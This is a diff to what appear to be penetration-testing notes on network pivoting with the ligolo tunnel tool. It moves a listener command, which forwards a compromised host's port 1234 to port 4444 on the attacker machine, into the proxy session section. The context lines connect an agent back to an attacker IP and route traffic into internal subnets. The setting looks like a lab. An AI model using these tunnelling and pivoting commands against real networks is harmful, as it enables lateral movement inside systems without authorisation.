@@ -108,6 +108,10 @@ sudo ip link set ligolo up
 
 Setting up tunnel:
 session
+listener_add --addr 0.0.0.0:1234 --to 0.0.0.0:4444
+# Creates a listener on the machine where we're running the agent at port 1234
+# and redirects the traffic to port 4444 on attacker machine.
+# You can use other ports, of course.
 sudo ip route add 172.16.5.0/24 dev ligolo
 sudo ip route add 172.16.6.0/24 dev ligolo
 ```
@@ -115,10 +119,7 @@ Agent:linux
 ```
 ./agent -connect 10.10.14.213:11601 -ignore-cert
 start
-listener_add --addr 0.0.0.0:1234 --to 0.0.0.0:4444
-# Creates a listener on the machine where we're running the agent at port 1234
-# and redirects the traffic to port 4444 on attacker machine.
-# You can use other ports, of course.
+
 ```
 Double Pivot
 ```
